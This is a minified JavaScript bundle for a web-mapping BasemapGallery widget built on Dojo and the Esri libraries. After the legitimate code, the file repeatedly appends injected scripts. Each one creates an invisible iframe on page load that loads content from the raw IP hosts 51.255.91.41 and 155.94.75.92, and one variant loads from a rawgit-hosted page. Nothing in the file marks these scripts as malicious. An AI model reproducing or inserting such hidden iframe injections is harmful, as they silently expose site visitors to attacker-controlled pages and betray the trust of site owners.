this.tileServers.push(b);if(a.subDomains&&0<a.subDomains.length&&1<k.authority.split(".").length){this.subDomains=a.subDomains;var p;g.forEach(a.subDomains,function(a){-1<k.authority.indexOf("${subDomain}")?p=k.scheme+"://"+t.substitute(k.authority,{subDomain:a})+"/":-1<k.authority.indexOf("{subDomain}")&&(p=k.scheme+"://"+k.authority.replace(/\{subDomain\}/gi,a)+"/");this.tileServers.push(p)},this)}this.tileServers=g.map(this.tileServers,function(a){"/"!==a.charAt(a.length-1)&&(a+="/");return a});
this._levelToLevelValue=[];var E=0;g.forEach(this.tileInfo.lods,function(a,b){this._levelToLevelValue[a.level]=a.levelValue||a.level;0===b&&(E=this._levelToLevelValue[a.level])},this);this._wmtsInfo=a.wmtsInfo;var B=h.hitch(this,function(){this.loaded=!0;this.onLoad(this)});c("chrome")?(e=this.getTileUrl(E,0,0),a=u.defaults.io,b="with-credentials"===a.useCors?w.canUseXhr(e,!0):-1,(a=-1<b?a.corsEnabledServers[b]:null)&&a.withCredentials?A({url:e,handleAs:"arraybuffer"}).addBoth(function(){B()}):B()):
B()},getTileUrl:function(c,a,b){c=this._levelToLevelValue[c];var f=this.tileServers[a%this.tileServers.length]+t.substitute(this.urlPath,{level:c,col:b,row:a}),f=f.replace(/\{level\}/gi,c).replace(/\{row\}/gi,a).replace(/\{col\}/gi,b),f=this._appendCustomLayerParameters(f),f=this.addTimestampToURL(f);return w.addProxy(f)},_appendCustomLayerParameters:function(c){var a,b;if(this._wmtsInfo&&(this._wmtsInfo.customLayerParameters||this._wmtsInfo.customParameters))for(a in b=h.clone(this._wmtsInfo.customParameters||
{}),h.mixin(b,this._wmtsInfo.customLayerParameters||{}),b)c+=(-1===c.indexOf("?")?"?":"\x26")+a+"\x3d"+encodeURIComponent(b[a]);return c}});c("extend-esri")&&h.setObject("layers.WebTiledLayer",e,z);return e})},"esri/layers/ImageServiceParameters":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/json dojo/has ../kernel ../lang".split(" "),function(e,h,g,q,c,t){e=e(null,{declaredClass:"esri.layers.ImageServiceParameters",extent:null,width:null,height:null,imageSpatialReference:null,
format:null,interpolation:null,compressionQuality:null,bandIds:null,timeExtent:null,mosaicRule:null,renderingRule:null,renderer:null,noData:null,compressionTolerance:null,adjustAspectRatio:null,lercVersion:null,toJson:function(c){var e=this.bbox||this.extent;c=(e=e&&c&&e._normalize(!0))?e.spatialReference.wkid||g.toJson(e.spatialReference.toJson()):null;var h=this.imageSpatialReference,e={bbox:e?e.xmin+","+e.ymin+","+e.xmax+","+e.ymax:null,bboxSR:c,size:null!==this.width&&null!==this.height?this.width+
","+this.height:null,imageSR:h?h.wkid||g.toJson(h.toJson()):c,format:this.format,interpolation:this.interpolation,compressionQuality:this.compressionQuality,bandIds:this.bandIds?this.bandIds.join(","):null,mosaicRule:this.mosaicRule?g.toJson(this.mosaicRule.toJson()):null,renderingRule:this.renderingRule?g.toJson(this.renderingRule.toJson()):null,renderer:this.renderer?g.toJson(this.renderer.toJson()):null,noData:this.noData,noDataInterpretation:this.noDataInterpretation,compressionTolerance:this.compressionTolerance,
adjustAspectRatio:this.adjustAspectRatio,lercVersion:this.lercVersion};c=this.timeExtent;e.time=c?c.toJson().join(","):null;return t.filter(e,function(c){if(null!==c&&void 0!==c)return!0})}});h.mixin(e,{INTERPOLATION_BILINEAR:"RSP_BilinearInterpolation",INTERPOLATION_CUBICCONVOLUTION:"RSP_CubicConvolution",INTERPOLATION_MAJORITY:"RSP_Majority",INTERPOLATION_NEARESTNEIGHBOR:"RSP_NearestNeighbor",NODATA_MATCH_ALL:"esriNoDataMatchAll",NODATA_MATCH_ANY:"esriNoDataMatchAny"});q("extend-esri")&&h.setObject("layers.ImageServiceParameters",
e,c);return e})},"widgets/BasemapGallery/utils":function(){define("dojo/_base/lang dojo/Deferred dojo/json dojo/_base/array dojo/promise/all esri/SpatialReference jimu/portalUtils jimu/shared/basePortalUrlUtils esri/request dojo/text!./esri_tileinfo.json".split(" "),function(e,h,g,q,c,t,u,z,A,w){function x(a){if(!a)return null;var b=a.indexOf("?");return 0===a.search(/http|\/\//)&&-1!==b?a.slice(0,b).replace(/\/*$/g,""):a}function n(a){return a?z.removeProtocol(x(a)):""}function r(a){var b=new h;
u.getPortalSelfInfo(a).then(e.hitch(this,function(f){var c=f.basemapGalleryGroupQuery;!0===f.useVectorBasemaps&&f.vectorBasemapGalleryGroupQuery&&(c=f.vectorBasemapGalleryGroupQuery);l.getBasemapGalleryGroup(a,c).then(e.hitch(this,function(a){a.queryItems({start:1,num:100,f:"json",q:u.webMapQueryStr}).then(e.hitch(this,function(a){b.resolve(a)}),e.hitch(this,function(){b.reject()}))}),e.hitch(this,function(){b.reject()}))}));return b}function y(a){return A({url:a,content:{f:"json"},handleAs:"json",
callbackParamName:"callback"}).then(function(a){return a},function(){return null})}var l={},v=g.parse(w);l._loadPortalBaseMaps=function(a,b){var f=new h,k=[];r(a).then(function(a){q.forEach(a.results,function(a){var f=new h,c=n(a.thumbnailUrl);k.push(f);a.getItemData().then(function(k){l._getBasemapSpatialReference(a,k).then(e.hitch(this,function(p){var g=k.baseMap.baseMapLayers;l.isBasemapCompatibleWithMap(p,g,b).then(e.hitch(this,function(b){b?f.resolve({layers:g,title:a.title||k.baseMap.title,
thumbnailUrl:c,spatialReference:p}):f.resolve({})}))}))})});c(k).then(function(a){a=q.filter(a,function(a){return a&&a.title?!0:!1},this);f.resolve(a)})},function(a){f.reject(a)});return f};l.isBasemapCompatibleWithMap=function(a,b,f){var c=new h,e=f.spatialReference,g=f.width>f.height?f.width:f.height;if(!e||!b||0>=b.length||!a||!e.equals(new t(+a.wkid)))return c.resolve(!1),c;0===f.getNumLevels()?"OpenStreetMap"===b[0].layerType||b[0].layerType&&-1<b[0].layerType.indexOf("BingMaps")||"WebTiledLayer"===
b[0].layerType||"VectorTileLayer"===b[0].layerType||"ArcGISImageServiceVectorLayer"===b[0].layerType||"ArcGISTiledImageServiceLayer"===b[0].layerType?c.resolve(!1):c.resolve(!0):b[0].layerType&&0===b[0].layerType.indexOf("ArcGIS")&&b[0].url?y(b[0].url).then(function(a){(b[0].serviceInfoResponse=a)&&a.tileInfo?c.resolve(l.tilingSchemeCompatible(f.__tileInfo,a.tileInfo,g)):a&&a.capabilities&&(0<=a.capabilities.indexOf("Map")||0<=a.capabilities.indexOf("Image"))?c.resolve(!0):c.resolve(!1)}):"WMS"===
b[0].layerType?c.resolve(!0):l.isNoUrlLayerMap(b)||"VectorTileLayer"===b[0].layerType?c.resolve(l.tilingSchemeCompatible(f.__tileInfo,v,g)):c.resolve(l.tilingSchemeCompatible(f.__tileInfo,b[0].tileInfo,g));return c};l.tilingSchemeCompatible=function(a,b,c){if(a&&b){var f=!1,e=!1,g,h;for(g=0;g<a.lods.length;g++){var l=a.lods[g].scale;a.dpi!==b.dpi&&(l=a.lods[g].scale/a.dpi);for(h=0;h<b.lods.length;h++){var C=b.lods[h].scale;a.dpi!==b.dpi&&(C=b.lods[h].scale/b.dpi);if(Math.abs(C-l)/C<1/c)if(f){e=!0;
break}else f=!0;if(C<l)break}if(e)break}a=e?!0:!f||1!==a.lods.length&&1!==b.lods.length?!1:!0;return a}return!0};l.isSameBasemapLayer=function(a,b){if(a.layerType&&b.layerType){if(a.layerType!==b.layerType)return!1;if("ArcGISImageServiceVectorLayer"===a.layerType||"ArcGISTiledImageServiceLayer"===a.layerType||"ArcGISTiledMapServiceLayer"===a.layerType||"ArcGISMapServiceLayer"===a.layerType||"ArcGISImageServiceLayer"===a.layerType)return a=n(a.url||""),b=n(b.url||""),a.toLowerCase()===b.toLowerCase();
if("BingMapsAerial"===a.layerType||"BingMapsRoad"===a.layerType||"BingMapsHybrid"===a.layerType||"OpenStreetMap"===a.layerType)return!0;if("VectorTileLayer"===a.layerType)return a=n(a.styleUrl||""),b=n(b.styleUrl||""),a.toLowerCase()===b.toLowerCase();if("WMS"===a.layerType)return a=n(a.mapUrl||""),b=n(b.mapUrl||""),a.toLowerCase()===b.toLowerCase();if("WebTiledLayer"===a.layerType){if(a.templateUrl&&b.templateUrl)return a=n(a.templateUrl||""),b=n(b.templateUrl||""),a.toLowerCase()===b.toLowerCase();
if(a.wmtsInfo&&b.wmtsInfo)return a=n(a.wmtsInfo.url||""),b=n(b.wmtsInfo.url||""),a.toLowerCase()===b.toLowerCase()}}else return a=n(a.url||""),b=n(b.url||""),a.toLowerCase()===b.toLowerCase();return!1};l.compareSameBasemapByOrder=function(a,b){a=a.layers;b=b.layers;if(a.length!==b.length)return!1;for(var c=0;c<a.length;c++)if(!l.isSameBasemapLayer(a[c],b[c]))return!1;return!0};l.isBingMap=function(a){if(!a||!a.layers)return!1;for(var b=0;b<a.layers.length;b++)if("BingMapsAerial"===a.layers[b].type||
"BingMapsRoad"===a.layers[b].type||"BingMapsHybrid"===a.layers[b].type)return!0;return!1};l.isNoUrlLayerMap=function(a){for(var b=0;b<a.length;b++)if("BingMapsAerial"===a[b].type||"BingMapsRoad"===a[b].type||"BingMapsHybrid"===a[b].type||"OpenStreetMap"===a[b].type)return!0;return!1};l.getToken=function(a){a=u.getPortal(a);a.updateCredential();return a.credential?"?token\x3d"+a.credential.token:""};l.removeUrlQuery=function(a){return x(a)};l.getStanderdUrl=function(a){return n(a)};l.getUniqueTitle=
function(a,b){if(!b||0===b.length)return a;b=q.filter(b,function(b){return b===a?!0:0===b.indexOf(a)?(b=b.substr(a.length+1),!isNaN(+b)):!1});if(0===b.length)return a;b=q.map(b,function(b){return b===a?0:+b.substr(a.length+1)});b=b.sort();return a+" "+(b[b.length-1]+1)};l.getBasemapInfo=function(a,b){var c,e;return u.getPortal(a).getItemById(b).then(function(a){c=a;return a.getItemData()}).then(function(a){e=a;return l._getBasemapSpatialReference(c,a)}).then(function(a){return{thumbnailUrl:c.thumbnailUrl,
title:c.title||e.baseMap.title,layers:e.baseMap.baseMapLayers,spatialReference:new t(a)}})};l.getBasemapGalleryGroup=function(a,b){var c=new h;a=u.getPortal(a);var g=b.indexOf("esri_");if(0<=g){var g=b.slice(g,g+7),p="esri_"+dojoConfig.locale.slice(0,2);b=b.replace(g,p)}a.queryGroups({f:"json",q:b}).then(e.hitch(this,function(a){0<a.results.length?c.resolve(a.results[0]):c.reject()}),e.hitch(this,function(){c.reject()}));return c};l._getBasemapSpatialReference=function(a,b){var c=null,g=!1,p=new h;
if(a.owner&&0===a.owner.indexOf("esri_")||l.isNoUrlLayerMap(b.baseMap.baseMapLayers))c={wkid:"102100"};else if(b.spatialReference||a.spatialReference)c=b.spatialReference||a.spatialReference;else if(b.baseMap.baseMapLayers&&b.baseMap.baseMapLayers[0])if(a=b.baseMap.baseMapLayers[0],a.url&&0<a.url.indexOf("rest/services"))g=!0,y(b.baseMap.baseMapLayers[0].url).then(e.hitch(this,function(a){a&&a.spatialReference&&(c=a.spatialReference);p.resolve(c)}),function(a){console.error(a);p.resolve(null)});else if("VectorTileLayer"===
a.layerType)c={wkid:"102100"};else if(b=a.fullExtent||a.initialExtent)c=b.spatialReference;g||p.resolve(c);return p};return l})},"widgets/BasemapGallery/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:esri/dijit/templates/BasemapGallery.html":'\x3cdiv class\x3d"esriBasemapGallery"\x3e\r\n  \x3cdiv dojoAttachPoint\x3d"flowContainer"\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e',"url:widgets/BasemapGallery/esri_tileinfo.json":'{\r\n  "rows": 256,\r\n  "cols": 256,\r\n  "dpi": 96,\r\n  "compressionQuality": 75,\r\n  "origin": {\r\n   "x": -2.0037508342787E7,\r\n   "y": 2.0037508342787E7\r\n  },\r\n  "spatialReference": {\r\n   "wkid": 102100,\r\n   "latestWkid": 3857\r\n  },\r\n  "lods": [\r\n   {\r\n    "level": 0,\r\n    "resolution": 156543.03392800014,\r\n    "scale": 5.91657527591555E8\r\n   },\r\n   {\r\n    "level": 1,\r\n    "resolution": 78271.51696399994,\r\n    "scale": 2.95828763795777E8\r\n   },\r\n   {\r\n    "level": 2,\r\n    "resolution": 39135.75848200009,\r\n    "scale": 1.47914381897889E8\r\n   },\r\n   {\r\n    "level": 3,\r\n    "resolution": 19567.87924099992,\r\n    "scale": 7.3957190948944E7\r\n   },\r\n   {\r\n    "level": 4,\r\n    "resolution": 9783.93962049996,\r\n    "scale": 3.6978595474472E7\r\n   },\r\n   {\r\n    "level": 5,\r\n    "resolution": 4891.96981024998,\r\n    "scale": 1.8489297737236E7\r\n   },\r\n   {\r\n    "level": 6,\r\n    "resolution": 2445.98490512499,\r\n    "scale": 9244648.868618\r\n   },\r\n   {\r\n    "level": 7,\r\n    "resolution": 1222.992452562495,\r\n    "scale": 4622324.434309\r\n   },\r\n   {\r\n    "level": 8,\r\n    "resolution": 611.4962262813797,\r\n    "scale": 2311162.217155\r\n   },\r\n   {\r\n    "level": 9,\r\n    "resolution": 305.74811314055756,\r\n    "scale": 1155581.108577\r\n   },\r\n   {\r\n    "level": 10,\r\n    "resolution": 152.87405657041106,\r\n    "scale": 577790.554289\r\n   },\r\n   {\r\n    "level": 11,\r\n    "resolution": 76.43702828507324,\r\n    "scale": 288895.277144\r\n   },\r\n   {\r\n    "level": 12,\r\n    "resolution": 38.21851414253662,\r\n    "scale": 144447.638572\r\n   },\r\n   {\r\n    "level": 13,\r\n    "resolution": 19.10925707126831,\r\n    "scale": 72223.819286\r\n   },\r\n   {\r\n    "level": 14,\r\n    "resolution": 9.554628535634155,\r\n    "scale": 36111.909643\r\n   },\r\n   {\r\n    "level": 15,\r\n    "resolution": 4.77731426794937,\r\n    "scale": 18055.954822\r\n   },\r\n   {\r\n    "level": 16,\r\n    "resolution": 2.388657133974685,\r\n    "scale": 9027.977411\r\n   },\r\n   {\r\n    "level": 17,\r\n    "resolution": 1.1943285668550503,\r\n    "scale": 4513.988705\r\n   },\r\n   {\r\n    "level": 18,\r\n    "resolution": 0.5971642835598172,\r\n    "scale": 2256.994353\r\n   },\r\n   {\r\n    "level": 19,\r\n    "resolution": 0.29858214164761665,\r\n    "scale": 1128.497176\r\n   },\r\n   {\r\n    "level": 20,\r\n    "resolution": 0.14929107082380833,\r\n    "scale": 564.248588\r\n   },\r\n   {\r\n    "level": 21,\r\n    "resolution": 0.07464553541190416,\r\n    "scale": 282.124294\r\n   },\r\n   {\r\n    "level": 22,\r\n    "resolution": 0.03732276770595208,\r\n    "scale": 141.062147\r\n   },\r\n   {\r\n    "level": 23,\r\n    "resolution": 0.01866138385297604,\r\n    "scale": 70.5310735\r\n   }\r\n  ]\r\n }',
"url:widgets/BasemapGallery/Widget.html":'\x3cdiv\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"basemapGalleryDiv" \x3e\x3c/div\x3e\r\n\t\x3cdiv data-dojo-type\x3d"jimu/dijit/LoadingIndicator" data-dojo-attach-point\x3d"loadingShelter" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e\r\n\r\n\r\n',"url:widgets/BasemapGallery/css/style.css":".jimu-widget-basemapgallery {height: 100%;}.jimu-widget-basemapgallery .esriBasemapGalleryNode:hover{color: #51B1FE;}.jimu-widget-basemapgallery .esriBasemapGalleryThumbnail {border: 1px solid #fff; margin: 1px; -moz-box-shadow: 0px 0px 0px #000; -webkit-box-shadow: 0px 0px 0px #000; box-shadow: 0px 0px 7px #000;}.jimu-widget-basemapgallery .esriBasemapGallerySelectedNode{color: #51B1FE;}.jimu-widget-basemapgallery .esriBasemapGalleryLabelContainer{padding-top: 2px;}.jimu-widget-basemapgallery .esriBasemapGalleryThumbnail{width: 100px; height: 67px;}.jimu-widget-basemapgallery .esriBasemapGallerySelectedNode .esriBasemapGalleryThumbnail{border-color: #51B1FE !important;}.jimu-widget-basemapgallery .esriBasemapGalleryNode {width: 85px; margin: 5px 10px 0 10px;}.jimu-rtl .jimu-widget-basemapgallery .esriBasemapGalleryNode {float: right;}.jimu-widget-basemapgallery .esriBasemapGalleryThumbnail {display: block; margin: 1px auto;}",
"*now":function(e){e(['dojo/i18n!*preload*widgets/BasemapGallery/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dijit/_WidgetsInTemplateMixin dojo/Deferred jimu/BaseWidget jimu/portalUtils jimu/PanelManager jimu/portalUrlUtils jimu/utils esri/dijit/Basemap esri/dijit/BasemapLayer esri/dijit/BasemapGallery dojo/_base/lang dojo/_base/array dojo/_base/html dojo/query dojo/on dojo/promise/all ./utils jimu/dijit/LoadingIndicator".split(" "),function(e,h,g,q,c,t,u,z,A,w,x,n,r,y,l,v,a,b){return e([q,h],{name:"BasemapGallery",baseClass:"jimu-widget-basemapgallery",basemapGallery:null,spatialRef:null,
startup:function(){this.inherited(arguments);this.initBasemaps()},resize:function(){this._responsive()},_responsive:function(){setTimeout(n.hitch(this,function(){var a=l("#"+this.id)[0],a=y.getStyle(a,"width"),b=parseInt(a/105,10);if(0<b){var c=parseInt(a%105/b,10);l(".esriBasemapGalleryNode",this.id).forEach(function(a){y.setStyle(a,"width",85+c+"px")})}}),100)},initBasemaps:function(){var f,e,h=n.clone(this.config.basemapGallery);this.loadingShelter.show();1===h.mode?f=b._loadPortalBaseMaps(this.appConfig.portalUrl,
this.map):(f=new g,f.resolve(h.basemaps));e=c.getPortal(this.appConfig.portalUrl).loadSelfInfo();a({portalSelf:e,basemaps:f}).then(n.hitch(this,function(a){for(var c=a.basemaps,f=[],e=0,g=this._getWebmapBasemap(),c=r.filter(c,function(c){if(!c||!c.title)return!1;var e;e=b.isBingMap(c)?a.portalSelf.bingKey?!0:!1:!0;return c.title&&e},this),e=0;e<c.length&&!b.compareSameBasemapByOrder(c[e],g);e++);e===c.length&&c.push(g);for(e=0;e<c.length;e++){for(var g=c[e].layers.length,k=[],l=0;l<g;l++)k.push(new w(c[e].layers[l]));
c[e].layers=k;c[e].thumbnailUrl?/^(https?:)?\/\//.test(c[e].thumbnailUrl)?c[e].thumbnailUrl+=b.getToken(this.appConfig.portalUrl):c[e].thumbnailUrl=z.processUrlInWidgetConfig(c[e].thumbnailUrl,this.folderUrl):c[e].thumbnailUrl=this.folderUrl+"images/default.jpg";f.push(new A(c[e]))}h.map=this.map;this.appConfig.portalUrl&&(h.portalUrl=this.appConfig.portalUrl);h.basemaps=f;h.showArcGISBasemaps=!1;h.bingMapsKey=a.portalSelf.bingKey;this.basemapGallery=new x(h,this.basemapGalleryDiv);this.basemapGallery.startup();
this.own(v(this.basemapGallery,"selection-change",n.hitch(this,this.selectionChange)));this._responsive();this.loadingShelter.hide()})).otherwise(n.hitch(this,function(){this.loadingShelter.hide()}))},_getWebmapBasemap:function(){var a;a=this.map.itemInfo.item.thumbnail?u.getItemUrl(this.appConfig.portalUrl,this.map.itemInfo.item.id)+"/info/"+this.map.itemInfo.item.thumbnail:null;return{title:this.map.itemInfo.itemData.baseMap.title,thumbnailUrl:a,layers:this.map.itemInfo.itemData.baseMap.baseMapLayers,
spatialReference:this.map.spatialReference}},selectionChange:function(){this.updateExtent();"widgetOnScreen"===this.gid&&t.getInstance().closePanel(this.id+"_panel")},updateExtent:function(){if(0<this.map.getNumLevels()){var a=this.basemapGallery.getSelected().getLayers(),b=this.map.__tileInfo.lods[this.map.getLevel()],c;if(0<a.length&&(a=a[0],(c=a.tileInfo||a.serviceInfoResponse&&a.serviceInfoResponse.tileInfo)&&b)){var e=b.scale/this.map.__tileInfo.dpi,g;r.forEach(c.lods,function(a){a=a.scale/c.dpi;
if(!g||Math.abs(a-e)<Math.abs(g-e))g=a});Math.abs(g-e)/e>1/this.map.width&&this.map.setScale(g*c.dpi)}}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});